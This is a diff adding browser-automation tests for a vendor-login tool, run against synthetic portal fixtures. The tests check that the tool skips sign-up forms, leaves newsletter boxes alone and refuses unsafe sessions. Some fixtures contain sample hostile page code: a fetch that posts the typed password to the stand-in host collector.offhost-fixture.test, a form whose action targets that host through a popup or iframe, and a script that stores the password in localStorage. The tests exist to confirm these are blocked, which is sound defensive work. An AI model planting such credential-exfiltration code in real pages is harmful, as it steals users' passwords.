@@ -41,13 +41,25 @@ const INVISIBLE_RECAPTCHA = `
   <div style="visibility:hidden;position:absolute;top:-10000px"><iframe src="https://www.google.com/recaptcha/api2/bframe?k=fixture" style="width:400px;height:580px"></iframe></div>`;
 const VISIBLE_RECAPTCHA = `<iframe src="https://www.google.com/recaptcha/api2/anchor?k=fixture&size=normal" style="width:304px;height:78px;border:0"></iframe>`;
 
-/** A hash-routed single-page app shaped like a QuickQuote login, entirely synthetic. */
-function quickpartsApp(options: { captcha?: string; offHost?: boolean; noForm?: boolean } = {}): string {
-  const form = options.noForm
-    ? `'<p>Welcome to the fixture portal.</p>'`
-    : `'<form id="login"><label>Email <input type="email" name="email" autocomplete="username"></label>'
+type AppOptions = {
+  captcha?: string;
+  offHost?: boolean;
+  noForm?: boolean;
+  /** Replaces the sign-in form markup (a JS string expression). */
+  form?: string;
+  /** Extra script run on submit, before the login request (a JS statement; `login` is the form). */
+  onSubmit?: string;
+  /** Extra script run after a successful login, before the reload. */
+  afterLogin?: string;
+};
+
+const SIGN_IN_FORM = `'<form id="login"><label>Email <input type="email" name="email" autocomplete="username"></label>'
       + '<label>Password <input type="password" name="password" autocomplete="current-password"></label>'
       + '<button type="submit">Sign in</button><p role="alert" id="error"></p></form>'`;
+
+/** A hash-routed single-page app shaped like a QuickQuote login, entirely synthetic. */
+function quickpartsApp(options: AppOptions = {}): string {
+  const form = options.noForm ? `'<p>Welcome to the fixture portal.</p>'` : options.form ?? SIGN_IN_FORM;
   return `<!doctype html><html><head><title>QuickQuote fixture</title></head><body><div id="app"></div>${options.captcha ?? INVISIBLE_RECAPTCHA}
     <script>
       const signedIn = ${SIGNED_IN};
@@ -60,12 +72,16 @@ function quickpartsApp(options: { captcha?: string; offHost?: boolean; noForm?: 
           app.innerHTML = ${form};
           const login = document.getElementById("login");
           if (login) login.addEventListener("submit", async (event) => {
+            if (login.target) return;
             event.preventDefault();
-            const response = await fetch("/api/login", { method: "POST", body: new URLSearchParams(new FormData(login)) });
+            ${options.onSubmit ?? ""}
+            const response = await fetch(login.getAttribute("data-endpoint") || "/api/login", { method: "POST", body: new URLSearchParams(new FormData(login)) });
             const data = await response.json().catch(() => ({}));
             if (!response.ok) { document.getElementById("error").textContent = "Invalid email or password."; return; }
             if (data.mfa) { app.innerHTML = '<label>Verification code <input name="code" autocomplete="one-time-code"></label>'; return; }
+            if (data.approve) { app.innerHTML = '<p>Approve the sign-in request on your phone to continue.</p>'; return; }
             ${SIGN_IN_COOKIE}
+            ${options.afterLogin ?? ""}
             location.hash = "#/";
             location.reload();
           });
@@ -96,7 +112,22 @@ function quickpartsSite(app: string, onSuccess?: unknown): Site {
     ...RECAPTCHA_FRAMES,
     "GET quickquote.quickparts.com/": html(app),
     "POST quickquote.quickparts.com/api/login": loginResponder(onSuccess),
+    "POST quickquote.quickparts.com/api/register": json(200, {}),
+    "POST collector.offhost-fixture.test/c": json(200, {}),
+    "GET collector.offhost-fixture.test/c": html(""),
   };
+}
+
+/** A home page whose sign-in control opens a menu of links, next to a newsletter box. */
+function menuLoginSite(): Site {
+  const home = `<!doctype html><title>Weerg fixture</title><body>
+    <header><button id="account" type="button">Login</button><nav id="menu" hidden><a href="/help">Help</a><a href="/orders">Orders</a></nav></header>
+    <form id="newsletter"><input type="email" name="email" placeholder="Your email"><button type="submit">Subscribe</button></form>
+    <script>
+      document.getElementById("account").addEventListener("click", () => { document.getElementById("menu").hidden = false; });
+      document.getElementById("newsletter").addEventListener("submit", (event) => { event.preventDefault(); fetch("/api/newsletter", { method: "POST" }); });
+    </script></body>`;
+  return { "GET www.weerg.com/": html(home), "POST www.weerg.com/api/newsletter": json(200, {}) };
 }
 
 /** A home page with a newsletter box and a modal sign-in, shaped like a marketing-site login. */
@@ -322,6 +353,61 @@ describe("login:vendors against synthetic portals", () => {
     expect(result).toMatchObject({ outcome: "saved" });
     expect(observed.posts.map((post) => post.target)).toEqual(["www.weerg.com/api/login"]);
     expect(saved.cookies.map((cookie: { domain: string }) => cookie.domain)).toEqual(["www.weerg.com"]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("never fills or submits a sign-up form that has the only password field", async () => {
+    const signUp = `'<form id="login" data-endpoint="/api/register"><label>Email <input type="email" name="email"></label>'
+      + '<label>Password <input type="password" name="password"></label><button type="submit">Create account</button></form>'`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: signUp })));
+    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:registration_or_reset_form" });
+    expect(observed.posts).toEqual([]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("picks the sign-in form over a sign-up form above it", async () => {
+    const both = `'<form id="signup" data-endpoint="/api/register"><input type="email" name="email"><input type="password" name="password" autocomplete="new-password">'
+      + '<button type="submit">Create account</button></form>' + ${SIGN_IN_FORM}`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: both })));
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("aborts a page script that posts the password to another host", async () => {
+    const exfiltrate = `fetch("https://collector.offhost-fixture.test/c", { method: "POST", body: new FormData(login).get("password") }).catch(() => {});`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("aborts a sign-in form that targets a popup or an iframe on another host", async () => {
+    for (const target of ["_blank", "sink"]) {
+      const form = `'<iframe name="sink" style="width:10px;height:10px"></iframe><form id="login" target="${target}" method="post" action="https://collector.offhost-fixture.test/c">'
+        + '<input type="email" name="email" autocomplete="username"><input type="password" name="password" autocomplete="current-password">'
+        + '<button type="submit">Sign in</button></form>'`;
+      const { result, observed, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form })));
+      expect(result.outcome).toBe("stopped");
+      expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
+      expect(saved).toBeNull();
+    }
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("refuses to save a session where the page kept the typed password", async () => {
+    const remember = `localStorage.setItem("remember", new FormData(document.getElementById("login")).get("password"));`;
+    const app = quickpartsApp({ onSubmit: remember });
+    const { result, saved } = await runLogin("quickparts", quickpartsSite(app));
+    expect(result).toMatchObject({ outcome: "stopped", reason: "not_saved:session_contains_credential" });
+    expect(saved).toBeNull();
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("stops at a text-only sign-in approval prompt", async () => {
+    const { result, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp(), { approve: true }));
+    expect(result).toMatchObject({ outcome: "stopped", reason: "two_factor:second_factor_prompt" });
+    expect(saved).toBeNull();
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("never puts the account email into a newsletter box next to a menu-style sign-in control", async () => {
+    const { result, observed } = await runLogin("weerg", menuLoginSite());
+    expect(result.outcome).toBe("stopped");
+    expect(observed.posts).toEqual([]);
   }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
 
   it("handles an email-first, password-second sign-in", async () => {
